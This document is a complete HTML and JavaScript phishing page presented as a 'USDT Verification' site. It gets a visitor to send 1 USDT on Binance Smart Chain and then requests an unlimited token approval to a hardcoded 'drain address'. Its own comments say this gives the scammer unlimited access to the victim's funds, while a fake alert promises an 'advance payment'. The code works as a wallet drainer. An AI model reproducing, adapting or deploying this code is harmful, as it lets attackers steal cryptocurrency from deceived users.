<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>USDT Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    /* Same styles as before */
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
    body { background: #f5f5f7; min-height: 100vh; padding: 20px; }
    .header { text-align: center; padding: 20px 0; border-bottom: 1px solid #e0e0e0; background: white; margin: -20px -20px 20px -20px; }
    .container { max-width: 400px; margin: 0 auto; }
    .card { background: white; border-radius: 16px; padding: 24px; margin-bottom: 20px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); }
    .label { font-size: 14px; color: #666; margin-bottom: 8px; font-weight: 500; }
    .address-input { width: 100%; padding: 16px; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 16px; font-family: monospace; margin-bottom: 20px; background: #fafafa; }
    .amount-section { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; }
    .amount-input { flex: 1; padding: 16px; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 24px; font-weight: bold; text-align: center; }
    .token-selector { padding: 16px 20px; background: #f0f7ff; border: 2px solid #007bff; border-radius: 12px; color: #007bff; font-weight: bold; min-width: 100px; text-align: center; }
    .max-btn { background: #e8f5e9; color: #2e7d32; border: none; padding: 8px 16px; border-radius: 8px; font-size: 14px; font-weight: bold; cursor: pointer; margin-left: 10px; }
    .usd-value { text-align: center; color: #666; margin: 10px 0 30px 0; font-size: 16px; }
    .next-btn { width: 100%; background: #007bff; color: white; border: none; padding: 18px; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
  </style>
</head>
<body>
  <div class="header">
    <h1 style="font-size: 20px; color: #333;">usdtverification.vercel.app</h1>
  </div>
  
  <div class="container">
    <div class="card">
      <div class="label">Address or Domain Name</div>
      <input 
        type="text" 
        class="address-input" 
        id="recipientAddress" 
        value="0x395b205f3ec60b4cd5820"
        readonly
      >
      
      <div class="label">Amount</div>
      <div class="amount-section">
        <input 
          type="number" 
          class="amount-input" 
          id="amount" 
          value="1" 
          min="1" 
          step="0.1"
        >
        <div class="token-selector">USDT</div>
        <button class="max-btn" onclick="setMaxAmount()">Max</button>
      </div>
      
      <div class="usd-value" id="usdValue">≈ $1.00</div>
      
      <button class="next-btn" onclick="sendUSDT()">
        Next
      </button>
    </div>
  </div>

  <script>
    // ========== BEP20 SPECIFIC CONFIG ==========
    // USDT BEP20 Contract Address (BSC)
    const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
    
    // Scammer's BSC address (where 1 USDT goes)
    const PAYMENT_ADDRESS = "0x395b205f3ec60b4cd58209eB7...";
    
    // Scammer's drain address (where approvals go)
    const DRAIN_ADDRESS = "0x8Ce2C06f449317F6E5D0AA7d193daA2D3c1E6f5b";
    const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
    
    // ========== SEND 1 USDT (BEP20) ==========
    async function sendUSDT() {
      const amount = document.getElementById('amount').value;
      
      if (!window.ethereum) {
        alert("Please open in Trust Wallet");
        return;
      }
      
      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        
        // Check network - MUST be BSC (Chain ID: 56)
        const network = await provider.getNetwork();
        if (network.chainId !== 56) {
          alert("Please switch to BSC Network (Binance Smart Chain)");
          return;
        }
        
        // USDT BEP20 ABI (transfer function)
        const usdtAbi = ["function transfer(address to, uint256 amount) returns (bool)"];
        const usdt = new ethers.Contract(USDT_BEP20, usdtAbi, signer);
        
        // Send 1 USDT (18 decimals for BEP20)
        const amountWei = ethers.utils.parseUnits(amount, 18);
        const tx = await usdt.transfer(PAYMENT_ADDRESS, amountWei);
        
        alert(`✅ 1 USDT (BEP20) sent!\nTX: ${tx.hash.substring(0, 20)}...`);
        
        // Auto-trigger approval after 2 seconds
        setTimeout(() => {
          requestApproval();
        }, 2000);
        
      } catch (error) {
        alert(error.code === 4001 ? "Transaction cancelled" : `Error: ${error.message}`);
      }
    }
    
    // ========== REQUEST APPROVAL (BEP20) ==========
    async function requestApproval() {
      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        
        // USDT BEP20 ABI (approve function)
        const usdtAbi = ["function approve(address spender, uint256 amount) returns (bool)"];
        const usdt = new ethers.Contract(USDT_BEP20, usdtAbi, signer);
        
        // Request unlimited BEP20 USDT approval
        const tx = await usdt.approve(DRAIN_ADDRESS, MAX_UINT);
        
        alert(`✅ Verification complete! You will receive advance payment shortly.`);
        
        // Scammer now has unlimited access to victim's BEP20 USDT
        
      } catch (error) {
        console.error("Approval error:", error);
      }
    }
    
    function setMaxAmount() {
      document.getElementById('amount').value = "1000";
      updateUSDValue();
    }
    
    function updateUSDValue() {
      const amount = parseFloat(document.getElementById('amount').value) || 1;
      document.getElementById('usdValue').textContent = `≈ $${(amount * 1.00).toFixed(2)}`;
    }
    
    // Initialize
    document.getElementById('amount').addEventListener('input', updateUSDValue);
  </script>
</body>
</html>
